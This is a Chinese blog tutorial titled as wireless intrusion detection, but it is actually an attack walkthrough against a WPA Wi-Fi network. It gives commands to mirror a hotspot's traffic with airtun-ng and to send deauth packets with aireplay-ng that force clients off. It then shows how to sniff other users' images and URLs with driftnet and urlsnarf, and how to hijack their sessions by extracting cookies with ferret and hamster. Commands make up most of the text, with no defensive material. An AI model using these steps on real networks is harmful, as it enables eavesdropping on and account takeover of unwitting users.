---
title: "wIDS无线入侵检测"
date: 2020-04-27 20:46:37
categories: 无线渗透
tags: Aircrack-ng套件
---

##### 一 、原理粗谈

使用 Airtun-NG 将无线热点下的所有流量镜像到一个虚拟接口下，监听此虚拟接口便可嗅探数据包，发现敏感信息。

##### 二 、创建虚拟接口

1. 开启网卡

   `ifconfig wlan0 up`

2. 开启网卡监听模式

   `airmon-ng start wlan0`

   <!--more-->

3. 创建虚拟接口

   

   ```
   airtun-ng -a B4:C4:FC:65:77:50 -p 88888888 -e test wlan0mon
   ```

   

   <img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-58-19.png">

   * -a：bssid
   * -p：wifi密码
   * -e：wifi名字

   由上图知，此时已经创建一个名叫"at0"的虚拟接口。

4. 开启此虚拟接口

   `ifconfig at0 up`

##### 三 、抓取握手包

发送deauth包让客户端断开重连，方便我们抓取到握手包

```
aireplay-ng -0 15 -a <bssid> -c <客户端mac地址> <监听模式的网卡>
```

![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-00-15.png)

当出现WPA handshake 表示已经抓取到握手包

![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-01-23.png)



##### 四、抓包嗅探

1. 此时所有流量都会被镜像到at0接口，我们对at0接口进行抓包

![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-03-33.png)

可看到此热点下的所有数据包

![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-04-28-1024x277.png)

2. 嗅探图片

   ```
   driftnet -i at0 -a -d /root/图片/
   ```

   

3. 嗅探URL

   `urlsnarf -i at0`

   ![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-17-11.png)

4. 抓取cookie

   将wireshark抓到的数据包保存后缀为pcap的格式，使用ferret解包

   ```
ferret -r test.pcap
   ```

   ![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-26-37.png)

   打开hamster，监听在本地的1234端口

   ![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-27-44.png)

   浏览器设置好代理 127.0.0.1:1234

   地址栏输入hamster
   
   ![](http://cdn.laohuan.art/2020/4/27Snipaste_2019-09-27_21-30-08-1024x489.png)